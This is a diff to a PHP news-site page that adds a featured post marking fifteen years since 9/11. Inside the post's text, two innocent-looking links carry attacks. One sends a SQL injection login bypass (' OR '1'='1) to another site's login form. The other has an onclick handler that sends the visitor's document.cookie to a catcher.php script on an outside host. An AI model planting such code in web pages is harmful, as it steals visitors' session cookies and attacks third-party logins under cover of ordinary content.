@@ -11,6 +11,30 @@ include 'header.php';
 	  
     	  
     <!-- headline -->    
+     <h2> <a href="/featured/20160911-fifteen-year-after-9-11.php">Fifteen years after 9/11: Terrorism a mutating virus adapting itself to the changing world</a></h2>
+       
+  <p class="details">Vishnupriya Bhandaram and Karan Pradhan Sep 11, 2016 11:08 IST <a href="#"></a> </p>
+           <div class="thumb"><a href="#"><img src="images/911.png" alt="9/11" /></a></div>
+       
+<p>
+A visual spectacle like <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
+271&submit=Login" target="_blank"> 9/11 </a> was grandly shocking and left an indelible mark, not just on US citizens, but citizens across the world. Post-9/11, if there has been one constant in most foreign policy rhetoric, it has been about <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#"> counter-terrorism measures. </a>
+
+</p>
+
+<p class="readmore">[ <a href="/featured/20160911-fifteen-year-after-9-11.php">read more</a> ]</p>
+	          	<div class="break"></div>
+</div>  
+<!-- end of post -->
+
+
+
+
+<!-- start of post  -->
+<div class="post">
+	  
+    	  
+    <!-- headline -->    
      <h2> <a href="/featured/20160910-russia-usa-agreement.php">Russia and the United States Reach New Agreement on Syria Conflict</a></h2>
        
   <p class="details">By DAVID E. SANGER and ANNE BARNARD, SEPT. 10 ,2016 <a href="#"></a> </p>
